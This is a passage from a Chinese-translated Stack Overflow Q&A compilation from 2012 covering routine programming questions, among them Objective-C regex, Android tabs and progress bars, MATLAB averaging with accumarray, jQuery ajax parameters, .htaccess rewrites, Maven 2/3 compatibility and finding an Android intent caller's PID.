## 回答 #1

> 赞同：2
> 
> 时间：2012-09-07T13:07:17.293

您正在寻找的正则表达式是`rhs: \"(\d+(?:\.\d+)*)`.

```
-(NSString*)getNumberFromString:(NSString*)theString
{
    NSError *error = NULL;
    NSRegularExpression *regex =
    [NSRegularExpression regularExpressionWithPattern:@"rhs: \"(\\d+(?:\\.\\d+)*)"
                                              options:NSRegularExpressionCaseInsensitive | NSRegularExpressionAnchorsMatchLines
                                                error:&error];

    NSArray *matches = [regex matchesInString:theString
                                      options:0
                                        range:NSMakeRange(0, [theString length])];

    NSTextCheckingResult *match = [matches objectAtIndex:0];
    return [theString substringWithRange:[match rangeAtIndex:1]];
}

...
     NSLog(@"%@", [self getNumberFromString:
                   @"{lhs: \"1 example\", rhs: \"44.5097254.00.124.2 sample\", error: \"\", icc: true}"]); 
```

**输出：** `44.5097254.00.124.2`

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-07T13:34:42.053

就像我在你之前的问题中编辑的那样，在正则表达式的末尾添加一个 * 可以做到这一点：

```
 -(NSString*)getNumberFromString(NSString*)theString{
    NSError *error = NULL;
    NSRegularExpression *regex = [NSRegularExpression regularExpressionWithPattern:@"rhs: \"(([0-9]*[.]*[0-9]*)*)" options:NSRegularExpressionCaseInsensitive | NSRegularExpressionAnchorsMatchLines error:&error];
    NSArray *matches = [regex matchesInString:theString options:0 range:NSMakeRange(0, [theString length])];
    NSTextCheckingResult *match = [matches objectAtIndex:0];
    return [theString substringWithRange:[match rangeAtIndex:1]]);

} 
```

对于未来，请尝试了解答案的作用。只需复制代码并认识到它不符合您的要求即可。但首先要自己做一些研究。您可以很容易地看到，添加星号将使表达式适用于每个长度的值。

# java - 现在不推荐使用 TabActivity 如何实现选项卡

> ID：12318629
> 
> 赞同：20
> 
> 时间：2012-09-07T13:00:16.477
> 
> 标签：java, android, android-tabhost

我正在尝试在活动中实现一些简单的选项卡。
我想我的 xml 代码没问题（我使用的是示例代码中的最小 tabHost/widget/FrameLayout），但是我在 java 端遇到了问题。
大多数关于如何做到这一点的文档都指向使用 TabWidget，这个类现在已被弃用。建议使用片段。但是片段似乎以一种完全不同的方式使用。
有人去一些示例代码，说明如何在 java 中实现一些在 xml 文件中定义的非常基本的选项卡，因为 TabHost 已被弃用。（示例 [here[ [1](http://developer.android.com/tools/samples/index.html)不使用 xml ）

* * *

## 回答 #1

> 赞同：16
> 
> 时间：2012-09-07T13:07:46.717

如果您访问 Android 开发人员指南，他们会向您展示如何做到这一点

[http://developer.android.com/reference/android/app/TabActivity.html](http://developer.android.com/reference/android/app/TabActivity.html)

有示例代码向您展示如何使用片段执行此操作

* * *

## 回答 #2

> 赞同：2
> 
> 时间：2012-09-07T13:08:52.800

使用片段创建标签。

一个很好的例子： [http ://thepseudocoder.wordpress.com/2011/10/04/android-tabs-the-fragment-way/](http://thepseudocoder.wordpress.com/2011/10/04/android-tabs-the-fragment-way/)

当然，您应该阅读官方文档中的 fragmentActivities：http: [//developer.android.com/reference/android/support/v4/app/FragmentActivity.html](http://developer.android.com/reference/android/support/v4/app/FragmentActivity.html)

搜索更多 - 还有许多其他示例如何以这种方式创建选项卡。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-07T13:06:14.293

创建包含带有小图像的线性布局，并实现带有导航到该图像（选项卡）的界面，

```
public interface Tabs {

    public void moveToTab1();
    public void moveToTab2();
    public void moveToTab3();
    public void moveToTab4();
}

public Activity implements Tabs {

    public void moveToTab1() {
        startActivity();
        finish();
    }
}

// other methods 
```

# javascript - 如何在总价值的复选框上应用javascript？

> ID：12318633
> 
> 赞同：1
> 
> 时间：2012-09-07T13:00:33.677
> 
> 标签：javascript, asp.net

我尝试打印选中复选框的总值。它已经可以使用，`input type="checkbox">` 但它已经使用 asp:checkbox/> 编写了代码。

我尝试但它是打印 NaN。

以下代码：四个复选框

```
<asp:CheckBox runat="server" ID="CheckBox1" Text="Mobile" Value="70" onclick="checkcount(this);" />
<asp:Label ID="lbltotal" runat="server"   ClientIDMode="Static"></asp:Label>
int amount=0;
function checkcount(item)
{                      
      amount += parseInt(document.getElementById(item.id).value);
      alert(amount);
      document.getElementById("lbltotal").innerHTML = amount;
} 
```

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-07T13:02:11.910

`parseInt(document.getElementById(item.id));`

应该：

`parseInt(document.getElementById(item.id).value);`

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-07T13:04:31.650

您可以尝试使用此代码

```
amount += parseInt(document.getElementById(item.id).value); 
```

# matlab - 中等价值矩阵

> ID：12318634
> 
> 赞同：0
> 
> 时间：2012-09-07T13:00:34.937
> 
> 标签：matlab, logic

我是 matlab 新手，找不到合适的代码来执行以下操作。

我有这个矩阵（2列）：

```
3,2348  265
2,2281  305
2,9321  315
3,6374  315
3,9069  355
1,8879  45
2,5944  45
3,3011  45
3,7679  95
4,1550  135
2,7442  135
4,1066  185
2,1129  185
1,7600  205
3,0655  225 
```

我想把它转换成这个（2列）：

```
2,5945  45
3,7680  95
3,4497  135
3,1098  185
1,7601  205
3,0656  225
3,2349  265
2,2281  305
3,2849  315
3,9070  355 
```

目标是在 matrix1 中，对于 col2 中的每个重复值，我们对 col1 中的对应值求平均值。

例如对于第 1 行，对于`45`(col2)--> `col1=(1,8880+2,5944+3,3012)/3`=`2,5945`

* * *

## 回答 #1

> 赞同：3
> 
> 时间：2012-09-07T13:53:57.667

这对[accumarray](http://www.mathworks.com/help/techdoc/ref/accumarray.html)来说是件好事：

```
A = [32348 265
     22281 305
     29321 315
     36374 315]; %# fill the rest of the matrix
[indices,ix] = sort(A(:,2),'ascend'); %# sort col2 in ascending order
data = A(ix,1); %# sort the values (col1) in the same way
groups = unique(indices);
mean_value = accumarray(indices, data, [numel(groups) 1], @mean);
%# the 4-argument version lets you specify a function to use (@mean in this case)

new_A = [mean_value groups]; %# this is the desired output 
```

如需更多阅读，请查看[此博客文章](http://blogs.mathworks.com/loren/2008/02/20/under-appreciated-accumarray/)。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-07T13:27:02.387

像这样的东西：

```
%A is the input matrix that you describe
A = [32348 265
     22281 305
     29321 315
     36374 315
     ...]

unique_values = unique(A(:, 2));
output = zeros(length(unique_values), 2);
for i=1:length(unique_values)
  output(i, 1) = mean(A(A(:, 2) == unique_values(i), 1));
end
output(:, 2) = unique_values; 
```

`unique(A(:, 2))`在第二列中查找唯一值。循环找到这些`for`唯一值中的每一个的平均值。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-07T22:24:43.480

我能想出的最简单的代码（*A*是你的输入矩阵）：

```
A = sortrows(A,2);
[B,i,j] = unique(A(:,2));
A = [accumarray(j,A(:,1),size(i),@mean),B]; 
```

# javascript - 如何在所有 ajax 调用中向 URL 添加参数？

> ID：12318637
> 
> 赞同：2
> 
> 时间：2012-09-07T13:00:39.857
> 
> 标签：javascript, jquery, url, backbone.js

我有一个使用 jQuery 的 Backbone 应用程序，并且想在`sessionId`所有 ajax 调用的 URL 中附加一个参数？

我怎样才能在 Backbone 或 jQuery 中做到这一点，也许以全局方式而不重写 Backbone.Sync？

所以如果我有 url `www.example.com/users`，我希望它变成`www.example.com/users?sessionId=12314q234123412`

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-07T13:08:10.070

您可以使用 的[高级选项`jQuery.ajax`](http://api.jquery.com/jQuery.ajax/#advanced-options)。在您的情况下，您应该注册一个全局[预过滤](http://api.jquery.com/extending-ajax/#Prefilters)器来修改 sent `data`。请注意仅在对您自己的域提出请求时才执行此操作，否则可能会导致安全漏洞。

另一种选择是创建一个简单的包装函数来扩展传入的选项：

```
 function myAjax(options) {
     options.url = "mydomain";
     options.data = $.extend(options.data||{}, {sessionID: 12345});
     return $.ajax(options);
 } 
```

* * *

## 回答 #2

> 赞同：1
> 
> 时间：2012-09-07T13:06:44.377

您可以使用全局[`.ajaxSend()`](http://api.jquery.com/ajaxSend/)事件。

# regex - .htaccess URLRewrite 规则 - 正则表达式

> ID：12318639
> 
> 赞同：0
> 
> 时间：2012-09-07T13:00:53.487
> 
> 标签：regex, .htaccess

我需要我的网站的重写规则。

我有以下类型的 URL：

```
http://bag-saver.com/store/category/yellow-bags/?brand=TedBaker 
```

但我想这样读：

```
http://bag-saver.com/store/category/yellow-bags-by-tedbaker/ 
```

这是我认为应该起作用的：

```
RewriteRule ^-(.*) ?brand=$1 
```

（它没有）

但除此之外，该`?brand`参数实际上可能显示为`&parameter`- 例如`?word=clutch&brand=TedBaker`。

总而言之 - 我希望将品牌参数放入静态 URL 的最后部分，前面加上“by”一词。无论品牌参数出现在 URL 字符串中的哪个位置，我都希望它能够正常工作。

这是当前的 .htaccess 文件：

```
# BEGIN WordPress
<IfModule mod_rewrite.c>
RewriteEngine On
RewriteBase /

RewriteRule ^index\.php$ - [L]
RewriteCond %{REQUEST_FILENAME} !-f
RewriteCond %{REQUEST_FILENAME} !-d
RewriteRule . /index.php [L]
</IfModule>

# END WordPress 
```

以下是需要应用的所有 URL：

```
http://bag-saver.com/store/category/black-bags/?brand=Jaeger
http://bag-saver.com/store/category/black-bags/?brand=Jaeger&word=Cross%20Body
http://bag-saver.com/store/category/black-bags/?word=Cross+Body&brand=Jaeger 
```

以上需要转换为 /store/category/black-bags-by-jaeger/ 或 /store/category/black-bags-by-jaeger/?word=Cross%20Body （用于第 2 和第 3 选项）。

I also have this: [http://bag-saver.com/store/search/?brand=Jaeger](http://bag-saver.com/store/search/?brand=Jaeger) which needs to be converted to /store/search/bags-by-jaeger/.

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-07T13:23:31.587

Try this : (if you can gives us all the variants of the url it would be better)

```
RewriteRule ^(.*)-by-([^/]+)/(.*)$ /$1/$3?brand=$2 [L,QSA] 
```

# windows - Windows 批处理脚本多个监视器

> ID：12318645
> 
> 赞同：0
> 
> 时间：2012-09-07T13:01:15.803
> 
> 标签：windows, batch-file

是否可以通过 Windows 批处理脚本在特定显示器上启动应用程序？另外，是否可以发送虚拟按键？如果不是，这是完成这项任务的最佳方法？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-07T13:57:23.503

您可以将[其](http://www.codeproject.com/Articles/3518/Executing-programs-remotely-in-Windows-NT-2000-XP)用于远程执行，并将[其](http://www.microsoft.com/en-us/download/details.aspx?id=27589)用于击键。

（我认为您应该能够使用SSH远程执行程序。需要远程系统上的SSH服务器。）

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2015-02-26T18:55:32.787

目前绝对没有办法使用 Batch 执行此操作。Windows 会在它发布的那一刻对其进行修补。

但是您可以运行连接到另一台用户计算机的程序。使用

```
CALL *program name + Extension* 
```

# iphone - 评价我的应用程序的链接在 iphone 中不起作用？

> ID：12318646
> 
> 赞同：0
> 
> 时间：2012-09-07T13:01:16.017
> 
> 标签：iphone, ios, ipad

我有一个 iPhone 应用程序，我在其中使用此链接来评价我在 itunes 中的应用程序。`http://itunes.apple.com/WebObjects/MZStore.woa/wa/viewContentsUserReviews?id=blabla&onlyLatestVersion=true&pageNumber=0&sortOrdering=1&type=Purple+Software`.在mac上工作正常，但在ipad和iphone显示无法连接。有人能帮我吗？也试过这个`http://itunes.apple.com/WebObjects/MZStore.woa/wa/viewContentsUserReviews?id=blabla&pageNumber=0&sortOrdering=1&type=Purple+Software&mt=8`。

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-07T14:40:06.973

尝试这个：

```
itms-apps://ax.itunes.apple.com/WebObjects/MZStore.woa/wa/viewContentsUserReviews?type=Purple+Software&id=BLABLAH 
```

虽然，[我认为这不再适用于 iOS6](https://github.com/nicklockwood/iRate/issues/38)。有人举报：

```
itms-apps://itunes.apple.com/LANGUAGE/app/idAPP_ID 
```

但我从未尝试过它，它可能会在正式发布之前改变。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-07T13:20:52.010

我不确定百分百，但您的 iTunes Store 国家/地区与我们的 iPhone、iPad 不同可能是个问题。我不能说，但您的应用程序是针对特定国家/地区的吗？如果是，请在设备中检查您的 AppStore 国家/地区。

# html - iframe 100% 高度问题

> ID：12318650
> 
> 赞同：0
> 
> 时间：2012-09-07T13:01:24.420
> 
> 标签：html, css, iframe

在这个问题中，我希望 iframe 占据整个蓝色框。

[小提琴](http://jsfiddle.net/jYvK2/1/)

我已经给了宽度和高度 100% 但高度没有效果。有什么修复吗？

* * *

## 回答 #1

> 赞同：1
> 
> 时间：2012-09-07T14:02:04.800

将您的更改`display: table-row`为`display: block`. 另请注意，填充 div 的高度百分比仅适用于具有固定高度的父容器，无论是 by`px`还是其他东西，或者是 percent `%`。***[这](http://jsfiddle.net/blasteralfred/jYvK2/9/)***是更正的小提琴。

否则，您可以尝试使用自己的布局。但添加`position: absolute;width:300px;height:250px;`到您的 div `#two`。如果您想使用百分比显示某些元素，则应定义其父容器的属性（宽度和高度），只有这样，子容器才会拉伸。

***[这](http://jsfiddle.net/blasteralfred/jYvK2/11/)***是小提琴。

* * *

## 回答 #2

> 赞同：0
> 
> 时间：2012-09-07T13:10:38.833

在 css 中给出`<div id="two">`一个。`height:100%`iframe 需要填充父元素，但没有设置它不会的高度。

* * *

## 回答 #3

> 赞同：0
> 
> 时间：2012-09-07T13:10:46.450

我在这个小提琴中稍微改变了你的代码。基本上你的蓝盒 div 需要一个高度值。[这是小提琴](http://jsfiddle.net/jYvK2/5/)

* * *

## 回答 #4

> 赞同：0
> 
> 时间：2012-09-07T13:14:40.650

您可以制作蓝色 div`position: relative`并为 iframe 使用以下 css：

```
iframe {
    position: absolute;
    left: 0px;
    right: 0px;
    top: 0px;
    bottom: 0px;
}

#two {
    position: relative;
    /* other CSS for #two */ 
} 
```

[小提琴](http://jsfiddle.net/jYvK2/6/)

# php - 在 CgridView 中使用对象获取值

> ID：12318652
> 
> 赞同：0
> 
> 时间：2012-09-07T13:01:28.810
> 
> 标签：php, date, widget, yii

> **可能重复：**
> [Yii gridview 在值中使用外部变量](https://stackoverflow.com/questions/11594164/yii-gridview-use-outside-variable-in-value)

我在 Yii 中开发以下代码，我知道我可以使用纯 php 或静态方法来获取 CGridView 的值，但现在我想使用对象的方法来获取值。但它找不到`$data`变量。我该如何解决？

```
<?php
Yii::import('application.dlib.*');
$jdate = new jCalendar();
$jdate->farsiDigits = false;
$this->widget('zii.widgets.grid.CGridView', array(
'id'=>'enterlog-grid',
'dataProvider'=>$model->search(),
'filter'=>$model,
'columns'=>array(
    'driverid',
    array(
                'name'=>'time',
                'value'=> $jdate->date("Y",$data->time)
             ),
    array(
        'class'=>'CButtonColumn',
    ),
),
)); ?> 
```

当我运行上面的代码时发生以下错误： `Undefined variable: data` 当我这样做时

```
'value'=> '$jdate->date("Y",$data->time)' 
```

以下错误`Undefined variable: jdate`

我该如何解决这个问题？

# jquery - 将项目符号附加到滑块图像

> ID：12318653
> 
> 赞同：0
> 
> 时间：2012-09-07T13:01:30.250
> 
> 标签：jquery

我已经建立了一个jsfiddle

[http://jsfiddle.net/K8aex/](http://jsfiddle.net/K8aex/)

我需要项目符号来移动幻灯片我也试图将项目符号的点击附加到相关幻灯片的索引我该怎么做？找到子弹的索引找到具有相同索引的img的索引？让那一张成为当前幻灯片？

任何帮助将不胜感激

```
 $('.bullets a').click(function(e) {
        e.preventDefault();
        var bulletIndex = (this).index()
        console.log(bulletIndex)
        wrapper.find('li:nth-child(bulletIndex) img').addClass('current');

    }); 
```

谢谢

* * *

## 回答 #1

> 赞同：2
> 
> 时间：2012-09-07T13:23:10.963

首先，我将创建抽象函数以滑动到特定图像，例如，您可以在其中设置属性并制作动画：

```
function slideTo(i) {
    ...
} 
```

您已经实现了它，但它在您的代码中非常分散。

您提供的点击处理程序也有一些错误，这是一个清理版本：

```
$('.bullets a').click(function(e) {
    e.preventDefault();
    var bulletIndex = $(this).text();
    slideTo(bulletIndex);
}); 
```

# java - 使用 log4j 动态记录项目名称？

> ID：12318654
> 
> 赞同：5
> 
> 时间：2012-09-07T13:01:37.807
> 
> 标签：java, log4j, project

是否可以使用属性动态记录项目名称（如 下面附加程序中的**${project.name}**）？我正在使用 log4j.xml 配置文件。

如果是，我在哪里可以定义这样的属性？

```
<appender name="console" class="org.apache.log4j.ConsoleAppender">
    <layout class="org.apache.log4j.PatternLayout">
        <param name="ConversionPattern"
            value="[${project.name}] %d{ISO8601} [%t] %-5p ..%c{3}.%M(%L)  - %m%n" />
    </layout>
</appender> 
```

通过这样做，我将能够在我的所有项目中使用相同的 log4j.xml。

* * *

## 回答 #1

> 赞同：4
> 
> 时间：2012-09-07T13:04:06.547

实现此目的的一种方法是使用[Maven](http://maven.apache.org/index.html)构建所有项目并使用[资源过滤](http://maven.apache.org/plugins/maven-resources-plugin/examples/filter.html)。

（当然 Ant 也可以做到这一点，可能任何其他构建系统也可以，但在 Maven 中这是众所周知的标准机制）

# android - Android进度条横向二级进度颜色

> ID：12318657
> 
> 赞同：1
> 
> 时间：2012-09-07T13:01:49.280
> 
> 标签：android, progress-bar

我想要一个有两种颜色的进度条。有时我想增加红色进度和绿色一些时间。简而言之，我想将进度条一分为二。如果我想以红色增加进度，一个绿色部分和另一个红色部分将以红色增加，与绿色相同。请注意，进度从左开始。我怎样才能做到这一点。我知道我应该使用次要进度但是如何？这是我的代码和我正在尝试做的事情。

```
final float[] roundedCorners = new float[] { 5, 5, 5, 5, 5, 5, 5, 5 };
    ShapeDrawable pgDrawable = new ShapeDrawable(new RoundRectShape(
            roundedCorners, null, null));

    if (answer == true) {

        pgDrawable.getPaint().setColor(Color.parseColor(greenColor));
        Log.i("green", ": should work");

    } else if (answer == false) {

        pgDrawable.getPaint().setColor(Color.parseColor(redColor));
        Log.i("red", ": should work");
    }

    ClipDrawable progress = new ClipDrawable(pgDrawable, Gravity.LEFT,
            ClipDrawable.HORIZONTAL);
    progressBarTotal.setProgressDrawable(progress);

    progressBarTotal.setBackgroundDrawable(getResources().getDrawable(
            android.R.drawable.progress_horizontal));

    if (TotalPercent >= 102) {

        Toast.makeText(ProcessGame.this, "Full", Toast.LENGTH_LONG).show();
    } else {
        progressBarTotal.setProgress(TotalPercent);

        TotalPercent = (TotalPercent + 1);

    } 
```

如果这可以在 java 中完成，我不想弄乱 xml 的东西。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-07T13:40:57.780

您可以创建自己的视图。

```
public class CustomProgressBar extends View{
    public CustomProgressBar(Context context, AttributeSet attribs){
        super(context, attribs);
        float xRadius = 5f, yRadius =  = 5f;

        Paint emptyPaint = new Paint();
        emptyPaint.setColor(Color.WHITE);

        Paint greenPaint = new Paint();
        greenPaint.setColor(Color.GREEN);

        Paint redPaint = new Paint();
        redPaint.setColor(Color.RED);

        Rectf emptyBar = new Rectf(0,0,0,0);
        Rectf greenBar = new Rectf(0,0,0,0);
        Rectf redBar = new Rectf(0,0,0,0);
    }

    public void setProgress(float greenProgress, float redProgress){
        //progress should be between 0f and 1f
        //but you can change it, just change how the width is calculated
        emptyBar.set(0,0,getWidth(), getHeight());
        greenBar.set(0,0,getWidth() * greenProgress, getHeight());
        redBar.set(0,0,getWidth() * redProgress, getHeight());
        //force the view to draw again
        invalidate();
    }

    @Override
    protected void onDraw(Canvas canvas){
        canvas.drawRoundRect(emptyBar, xRadius,yRadius, emptyPaint);
        canvas.drawRoundRect(greenBar, xRadius,yRadius, greenPaint);
        canvas.drawRoundRect(redBar, xRadius,yRadius, redPaint);
    }
} 
```

在 xml 中，视图看起来像

```
<com.mydomain.widgets.CustomProgressBar 
    android:layout_width="fill_parent"
    android:layout_height="10dip"
/> 
```

该代码只是如何完成它的示例。可以进行一些改进，例如，您可以将视图的宽度和高度值存储在局部变量中以避免一直调用`getWidth`，`getHeight`但您只能在特定位置执行此操作，例如在活动`onWindowFocusChanged`回调中，否则 getWidth 和 getHeight将返回 0。空条也可以用适当的值初始化一次，以避免每次都设置。

# java - 围绕 ResultSet 的设计考虑和基于索引的检索的常量声明

> ID：12318664
> 
> 赞同：1
> 
> 时间：2012-09-07T13:02:11.650
> 
> 标签：java, sql

目前，我有十个不同的查询，它们通过 JDBC 处理，并包装在返回 ResultSet 的函数中。这些 ResultSet 对象中的每一个都由外部程序迭代，并将通过它们的索引而不是每个需求的列名来访问。我正在考虑三种方法，并且正在寻找当前的最佳实践来处理这个问题，同时尽可能接近纯 OO 设计。现在我的架构如下所示：

```
create table Cats
(  
    name varchar2,
    age number,
    length number,  
    location varchar2,
    isStray varchar2
); 
```

我的两个查询是这样的：

```
 public ResultSet getAllCats()  
{  
    Select * from Cats;  
}  

public ResultSet getCatAgeAndName(){
    Select cat.age,cat.name from Cats cat
} 
```

现在我考虑通过以下方式访问这些属性的方法`ResultSet.getXXX(index);`

如下面所述：

```
public static final int GET_CAT_AGE_AND_NAME_AGE_INDEX = 1;   
public static final int GET_CAT_AGE_AND_NAME_NAME_INDEX = 2; 
```

或者

```
public enum GetCatAgeAndNamePosition  
   {  
      AGE(1),
      NAME(2);
   } 
```

或者

```
 public class GetCatAgeAndNameQuery  
 {  
      public enum Position  
      {  
           AGE(1),
            NAME(2);
      }  

      private ResultSet results;
 } 
```

第一种方法是每个查询每个索引一个静态最终结果。
第二个是每个查询的枚举。
第三个是每个查询一个类。

上述哪一项或任何其他保持这种纯粹性和可维护性的见解是可用的。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-07T14:06:58.587

我喜欢用`enum`s。它们增加了灵活性。例如，可以同时提供序数值和列名。按名称而不是按序号检索应该使事情更加健壮。对于像`SELECT *`. 使用`enum`，更容易关联更多信息，例如`type`信息。很高兴根据表元数据生成这些类。

我倾向于将其`enum`作为对表、视图或存储过程进行操作的服务类的私有成员。它仅在内部用于执行从关系结构到结果 bean 的映射。关系结构不需要对外暴露，所以`enum`. `enum`对同一底层结构上的多个相关查询重用相同也是很好的。在您的示例中，`enum`应该具有表的所有列，并且不同的查询将使用所有或部分列。按名称查找比按索引查找更好的另一个原因。

# google-closure-library - 从 html 文本中关闭库 dom 节点

> ID：12318667
> 
> 赞同：5
> 
> 时间：2012-09-07T13:02:15.247
> 
> 标签：google-closure-library

我有一个像这样的html文本：

`'<div class="a"><span>1</span><div>2</div></div>'`

闭包库中是否有一个函数可以获取这样的字符串作为输入并返回 DOM 树以插入到文档中？

* * *

## 回答 #1

> 赞同：14
> 
> 时间：2012-09-07T18:37:34.100

闭包库提供了从对象[**`goog.dom.safeHtmlToNode(html)`**](https://github.com/google/closure-library/blob/fab924fd90b343996a7a2dbd0ebc1394e63e38a9/closure/goog/dom/dom.js#L907)创建文档片段 ( `Node`)的功能`goog.html.SafeHtml`，可以使用`goog.html.sanitizer.HtmlSanitizer`如下所示创建。

# 例子

```
<!doctype html>
<html>
<head>
  <title>Closure Library Dom Test</title>
  <script src="https://cdn.rawgit.com/google/closure-library/master/closure/goog/base.js"></script>
  <script>
    goog.require('goog.dom');
    goog.require('goog.html.SafeHtml');
    goog.require('goog.html.sanitizer.HtmlSanitizer');
  </script>
</head>

<body>
<h1>Closure Library Dom Test</h1>

<div id="main">
</div>

<script>
  var sanitizer = new goog.html.sanitizer.HtmlSanitizer.Builder().build();
  var fragment = goog.dom.safeHtmlToNode(
      sanitizer.sanitize('<div class="a"><span>1</span><div>2</div></div>'));

  goog.dom.append(/** @type {!Node} */(document.querySelector('#main')),
      /** @type {!Node} */(fragment));
</script>

</body>
</html> 
```

# android - 通过将另一个图像的像素设置为其位置坐标来覆盖图像

> ID：12318673
> 
> 赞同：1
> 
> 时间：2012-09-07T13:02:39.877
> 
> 标签：android, android-layout, bitmap

我是使用 android 的 Canvas 和 Bitmap 区域的新手。

我正在为我的大学开发地图导航器应用程序。我不必使用谷歌地图。相反，我将使用目标位置地图的图像，例如我的大学。

现在，当一个人搜索某个地方时，图像应该在那个地方显示一个标记，该标记应该临时附加到图像上，这样当地图（图像）被缩放或向上/向下滑动时，标记也应该被缩放并随图片。

它甚至可能吗？

我正在寻找的是在图像上覆盖该标记并附加到它的方法，以便在缩放或滑动时它可以与图像一起移动。

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-07T13:36:47.433

如果您有 2 张图片（大小是否相同，取决​​于您），您希望将一张图片覆盖到另一张图片，您可以执行以下操作：

```
// 2 bitmap images are : Bitmap image1, image2\. You know how to get it right?
image1 = image1.copy(Config.ARGB_8888, true);
image2 = image2.copy(config.ARGB_8888, true);

//Get color at the pixel (0,0)
int color = image2.getPixel(0,0);
//Set the color of pixel (0,0) of image2 to same color with pixel (0,0) of image 1
image2.setPixel(0,0,color); 
```

请注意，2 个图像必须具有相同的配置！！

如果您想在地图中绘制它：

```
//Your Bitmap map must config like above
Canvas canvas = new Canvas(map);
Paint paint = new Paint();
paint.setColor(Color.RED);
paint.setAntiAlias(true);
// Draw yourMakerBitmap from pixel(0,0) of your map
canvas.drawBitmap(yourMakerBitmap, 0, 0, paint); 
```

在你打电话后`canvas.drawBitmap(...)`，你的`map`意志就会`maker`过去。现在你可以用 new 做任何你喜欢的事情`map`了`maker`！

# java - MyBatis - 映射树数据结构

> ID：12318680
> 
> 赞同：1
> 
> 时间：2012-09-07T13:03:04.647
> 
> 标签：java, jakarta-ee, mybatis

如何将表映射`id | parent_id | name`到我的 pojo 类：

```
public class Node {
  private Integer id;
  private Integer parentId;
  private String name;
  private List<Node> children;
  //getters and setters
} 
```

我想获取填充子列表的根节点列表（parent_id=null）。树的深度没有限制。我正在考虑类似的事情：

```
<resultMap id="nodeResult" type="Node">
  <id property="id" column="id"/>
  <result property="parentId" column="parent_id"/>
  <result property="name" column="name"/>
  <collection property="children" resultMap="nodeResult"/>
</resultMap>
<select id="selectNode" resultMap="nodeResult">
  SELECT * FROM NODE
</select> 
```

我不知道在哪里限制子列表：id=parentId。我不想使用嵌套选择

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-07T17:22:07.713

没有办法让任意深度的树自动填充到 ResultMap 中。

数据库特定的解决方案是一种选择吗？例如，使用 PostgreSQL，您可以使用公用表表达式将数据选择到可能适用于映射到树的 ResultSet 中。

否则，您应该只更改 ResultMap 中的集合定义以指向查询以选择子项，这可以重用相同的结果图来获得递归行为

# ruby-on-rails - rails - remotipart 在 Rails 3.2.8 中不起作用

> ID：12318682
> 
> 赞同：1
> 
> 时间：2012-09-07T13:03:08.983
> 
> 标签：ruby-on-rails, jquery

自从更新到 Rails 3.2.8 remotipart 停止工作。我可以看到页面中包含 iframe-transport.js 和 remotipart.js，并且表单是通过 AJAX 提交的，但图像不包含在 :params 中。当我禁用 Javascript 图像时包含在 :params 中，所以这很奇怪。

有人能想到什么吗？

* * *

## 回答 #1

> 赞同：-1
> 
> 时间：2013-01-31T07:15:37.057

原因可能是当前 remotipart 版本与最新 jquery-rails gem 中使用的 jquery 1.9 不兼容。它可以通过手动应用[这个补丁](https://github.com/JangoSteve/remotipart/pull/57)来解决（对我有用）。

# java - 运行 Maven2 和 Maven3

> ID：12318684
> 
> 赞同：1
> 
> 时间：2012-09-07T13:03:11.250
> 
> 标签：java, maven

我目前正在构建一个新服务器来替换我们现有的实时系统，并借此机会将所有系统更新到最新状态。不幸的是，在最终确定转换之前，我们需要将这两个系统作为实时服务并行运行几个月。在此期间，我们将在每晚运行重建，因为服务器上运行的应用程序的开发正在进行中。

我遇到的问题是现有系统正在运行 Maven 2，而新系统正在运行 Maven 3。目前我们对新服务器的重建正在生成 Maven 警告（“[WARNING] 'build.plugins.plugin.version' for org.codehaus.mojo:versions-maven-plugin is missing”）并且应用程序无法构建。

是否有解决方案可以让我修复这些警告，以便一切都建立在 Maven 2 和 Maven 3 上？由于开发基础设施在 subversion 中分支代码不是一种选择。

查看一些文档，它建议将存储库定义移动为插件存储库定义。我可以将存储库添加到插件存储库中，同时将它们保留在存储库下吗？这会导致任何版本的 Maven 出现问题吗？或者是否有解决问题的替代方案？

* * *

## 回答 #1

> 赞同：0
> 
> 时间：2012-09-07T13:07:31.383

Maven 3 是向后兼容的，但更严格，所以如果你修复了 Maven 3 的 pom.xml，你不会破坏 Maven 2 的支持。

根据我的阅读，您只需要使用显式插件版本，这很容易做到，最佳实践是[`<pluginManagement>`](http://maven.apache.org/pom.html#Plugin_Management)在项目通用的父 pom 的部分中进行。

# android - 发送意图的进程的 Pid

> ID：12318687
> 
> 赞同：3
> 
> 时间：2012-09-07T13:03:13.610
> 
> 标签：android, android-intent

我正在尝试发现向我发送意图的进程的进程 ID 或包名称。我不想将进程 ID 或包名称放在额外的位置（正如其他一些问题所问的那样），因为我不想允许欺骗。我使用的代码是：

```
@Override
public void onCreate(Bundle savedInstanceState) {
    super.onCreate(savedInstanceState);
    setContentView(R.layout.activity_secure_file_share);
    ...   

    Intent intent = getIntent();

    if (intent != null)
    {
        // get the caller
        String callingPackage = getAppNameByPID(getApplicationContext(),
               Binder.getCallingPid());
    ....
    }
 } 
```

where`getAppNameByPID`将 PID 转换为包名称。问题是它`Binder.getCallingPid()`总是返回接收者的 PID（而不是调用者的）。

你如何获得调用者的PID？

* * *

## 回答 #1

> 赞同：7
> 
> 时间：2012-09-07T13:19:57.657

我也试过这个，我只能使用绑定服务得到结果。

```
@Override
public IBinder onBind(Intent intent) {
    @SuppressWarnings("static-access")
    int uid = mBinder.getCallingUid();

    final PackageManager pm = getPackageManager();
    String name = pm.getNameForUid(uid);

    Log.d("ITestService", String.format("onBind: calling name: %s"), name);

    //name is your own package, not the caller

    return mBinder;
} 
```

但是如果你实现你的 AIDL 的存根：

```
private final ITestService.Stub mBinder = new ITestService.Stub() {
    public void test() {
        //Get caller information
        //UID
        int uid = Binder.getCallingUid();

        final PackageManager pm = getPackageManager();
        String name = pm.getNameForUid(uid);        
